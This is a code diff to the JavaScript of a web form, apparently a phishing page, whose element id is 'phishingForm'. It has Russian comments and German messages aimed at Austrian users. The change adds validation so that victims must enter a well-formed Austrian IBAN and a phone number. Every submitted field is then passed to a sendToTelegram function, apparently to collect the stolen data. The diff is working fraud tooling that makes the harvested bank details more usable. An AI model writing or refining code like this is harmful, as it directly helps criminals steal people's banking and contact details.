@@ -74,7 +74,6 @@ document.addEventListener('DOMContentLoaded', function() {
     const phoneInput = document.getElementById('phoneInput');
     const submitBtn = document.getElementById('submitBtn');
 
-    // ВАЖНО: кнопка больше не блокируется из-за IBAN
     if (submitBtn) {
         submitBtn.disabled = false;
     }
@@ -125,29 +124,98 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     // ============================================================
-    // 🏦 IBAN — БЕЗ ПРОВЕРКИ НА САЙТЕ (просто разрешаем ввод)
+    // 🏦 IBAN — С ВАЛИДАЦИЕЙ ДЛЯ AT
     // ============================================================
     if (ibanInput) {
-        // Убираем ограничение maxLength, чтобы можно было ввести любую длину
         ibanInput.maxLength = 34;
 
         ibanInput.addEventListener('input', function() {
-            // Просто приводим к верхнему регистру и убираем пробелы
             let value = this.value.replace(/\s/g, '').toUpperCase();
             this.value = value;
 
-            // Обновляем глобальную переменную (без проверки)
-            ibanCheckResult = {
-                valid: false,
-                message: 'nicht geprüft',
-                bankData: null,
-                iban: value
-            };
+            // Валидация для австрийского IBAN
+            const ibanError = document.getElementById('ibanError');
+            if (ibanError) ibanError.style.display = 'none';
+
+            // Проверка: начинается с AT и длина от 20 до 34
+            if (value.length > 0) {
+                if (!value.startsWith('AT')) {
+                    if (ibanError) {
+                        ibanError.textContent = 'IBAN muss mit AT beginnen.';
+                        ibanError.style.display = 'block';
+                    }
+                    ibanCheckResult = {
+                        valid: false,
+                        message: 'muss mit AT beginnen',
+                        bankData: null,
+                        iban: value
+                    };
+                    return;
+                }
+
+                if (value.length < 20) {
+                    if (ibanError) {
+                        ibanError.textContent = 'IBAN muss mindestens 20 Zeichen enthalten.';
+                        ibanError.style.display = 'block';
+                    }
+                    ibanCheckResult = {
+                        valid: false,
+                        message: 'zu kurz',
+                        bankData: null,
+                        iban: value
+                    };
+                    return;
+                }
+
+                if (value.length > 34) {
+                    if (ibanError) {
+                        ibanError.textContent = 'IBAN darf maximal 34 Zeichen enthalten.';
+                        ibanError.style.display = 'block';
+                    }
+                    ibanCheckResult = {
+                        valid: false,
+                        message: 'zu lang',
+                        bankData: null,
+                        iban: value
+                    };
+                    return;
+                }
+
+                // Проверка на допустимые символы (только буквы и цифры)
+                if (!/^[A-Z0-9]+$/.test(value)) {
+                    if (ibanError) {
+                        ibanError.textContent = 'IBAN darf nur Buchstaben und Zahlen enthalten.';
+                        ibanError.style.display = 'block';
+                    }
+                    ibanCheckResult = {
+                        valid: false,
+                        message: 'ungültige Zeichen',
+                        bankData: null,
+                        iban: value
+                    };
+                    return;
+                }
+
+                // Если всё ок
+                ibanCheckResult = {
+                    valid: true,
+                    message: 'gültig',
+                    bankData: null,
+                    iban: value
+                };
+            } else {
+                ibanCheckResult = {
+                    valid: false,
+                    message: 'nicht geprüft',
+                    bankData: null,
+                    iban: ''
+                };
+            }
         });
     }
 
     // ============================================================
-    // 🚀 ОТПРАВКА ФОРМЫ (без проверки IBAN)
+    // 🚀 ОТПРАВКА ФОРМЫ (с проверкой IBAN)
     // ============================================================
     const form = document.getElementById('phishingForm');
     if (!form) return;
@@ -155,10 +223,28 @@ document.addEventListener('DOMContentLoaded', function() {
     form.addEventListener('submit', function(event) {
         event.preventDefault();
         
-        // Проверяем только телефон (чтобы не отправлять пустую форму)
+        // Проверяем телефон
         const phoneDigits = phoneInput.value.replace(/[^0-9]/g, '');
         if (phoneDigits.length < 6) {
             alert('Bitte geben Sie eine gültige Telefonnummer ein (mindestens 6 Ziffern).');
+            return;
+        }
+
+        // Проверяем IBAN
+        const ibanValue = ibanInput.value.trim();
+        if (!ibanValue.startsWith('AT')) {
+            alert('Bitte geben Sie eine gültige österreichische IBAN ein (beginnt mit AT).');
+            ibanInput.focus();
+            return;
+        }
+        if (ibanValue.length < 20) {
+            alert('Die IBAN muss mindestens 20 Zeichen enthalten.');
+            ibanInput.focus();
+            return;
+        }
+        if (!/^[A-Z0-9]+$/.test(ibanValue)) {
+            alert('Die IBAN darf nur Buchstaben und Zahlen enthalten.');
+            ibanInput.focus();
             return;
         }
         
@@ -168,7 +254,6 @@ document.addEventListener('DOMContentLoaded', function() {
             data[key] = value.trim() || 'nicht angegeben';
         });
         
-        // Добавляем текущий статус IBAN (всегда 'nicht geprüft')
         data.iban_check = ibanCheckResult;
         sendToTelegram(data);
     });
